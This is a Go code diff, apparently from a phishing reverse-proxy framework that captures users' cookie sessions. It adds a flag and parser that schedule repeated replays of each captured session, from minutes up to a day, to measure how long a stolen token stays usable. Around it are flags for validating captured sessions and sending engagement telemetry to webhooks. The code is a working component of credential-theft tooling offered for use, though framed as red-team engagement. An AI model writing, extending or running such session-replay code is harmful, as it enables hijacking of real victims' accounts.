@@ -4,6 +4,7 @@ import (
 	"context"
 	"errors"
 	"flag"
+	"fmt"
 	_log "log"
 	"os"
 	"os/user"
@@ -58,6 +59,34 @@ var js_inspect_endpoint = flag.String("js-inspect-endpoint", "/_assets/js/v.js",
 var enable_session_validator = flag.Bool("enable-session-validator", false, "Asynchronously validate captured cookie sessions")
 var webhook_url = flag.String("webhook-url", "", "Discord, Slack, or generic JSON webhook that receives every engagement telemetry stage")
 var telemetry_file = flag.String("telemetry-file", "", "Append ATT&CK-tagged telemetry events to this JSONL file")
+var session_recheck_schedule = flag.String("session-recheck-schedule", "5m,30m,2h,8h,24h", "Comma-separated delays after capture at which a still-valid session is replayed again, measuring how long a stolen token stays usable (empty disables rechecks)")
+
+// parseRecheckSchedule turns the -session-recheck-schedule flag into the
+// delays the validation worker re-arms a session at. An empty value means no
+// rechecks, which is a single validation per capture -- the behavior before
+// the flag existed.
+func parseRecheckSchedule(value string) ([]time.Duration, error) {
+	value = strings.TrimSpace(value)
+	if value == "" {
+		return nil, nil
+	}
+	var schedule []time.Duration
+	for _, field := range strings.Split(value, ",") {
+		field = strings.TrimSpace(field)
+		if field == "" {
+			continue
+		}
+		delay, err := time.ParseDuration(field)
+		if err != nil {
+			return nil, fmt.Errorf("invalid recheck delay %q: %w", field, err)
+		}
+		if delay <= 0 {
+			return nil, fmt.Errorf("recheck delay %q must be positive", field)
+		}
+		schedule = append(schedule, delay)
+	}
+	return schedule, nil
+}
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -375,8 +404,14 @@ func main() {
 
 	var sessionValidator *validation.Worker
 	if *enable_session_validator {
+		recheckSchedule, scheduleErr := parseRecheckSchedule(*session_recheck_schedule)
+		if scheduleErr != nil {
+			log.Fatal("session validator: %v", scheduleErr)
+			return
+		}
 		sessionValidator, err = validation.NewWorker(validation.WorkerConfig{
-			Emitter: telemetryBus,
+			Emitter:         telemetryBus,
+			RecheckSchedule: recheckSchedule,
 			OnResult: func(result validation.Result) {
 				log.Info("session validator: %s session %s for %s", result.Status, result.SessionReference, result.TargetHost)
 			},
